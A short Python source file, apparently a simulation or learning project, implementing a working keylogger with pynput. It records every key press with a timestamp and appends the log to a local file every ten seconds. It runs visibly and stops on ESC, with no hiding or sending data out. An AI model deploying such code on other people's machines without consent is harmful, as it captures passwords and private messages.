# src/keylogger_sim/keylogger.py
import threading
import time
from pynput import keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self, log_file="keystrokes.log"):
        self.log_file = log_file
        self.buffer = []
        self.running = False
        self.listener = None
        
    def start(self):
        """Start the keylogger in a background thread"""
        self.running = True
        self.listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self.listener.start()
        # Auto-flush thread
        threading.Thread(target=self._auto_flush, daemon=True).start()
        
    def _on_press(self, key):
        """Callback for key press events"""
        if not self.running:
            return False
            
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                keystroke = key.char
            else:
                keystroke = f'[{key.name.upper()}]'
                
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self.buffer.append(f"{timestamp} | {keystroke}")
            
        except Exception as e:
            self.buffer.append(f"[ERROR] {str(e)}")
            
    def _on_release(self, key):
        """Stop listener on ESC key"""
        if key == keyboard.Key.esc:
            self.running = False
            self.flush()
            return False
            
    def _auto_flush(self):
        """Periodically flush buffer to file"""
        while self.running:
            time.sleep(10)  # Flush every 10 seconds
            self.flush()
            
    def flush(self):
        """Write buffer contents to log file"""
        if not self.buffer:
            return
        with open(self.log_file, "a") as f:
            f.write("\n".join(self.buffer) + "\n")
        self.buffer.clear()
        
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        if self.listener:
            self.listener.stop()
        self.flush()
        
# Usage
if __name__ == "__main__":
    logger = KeyLogger()
    logger.start()
    print("Keylogger running... Press ESC to stop")
    input()  # Wait for ESC
    logger.stop()
    print("Logs saved to keystrokes.log")
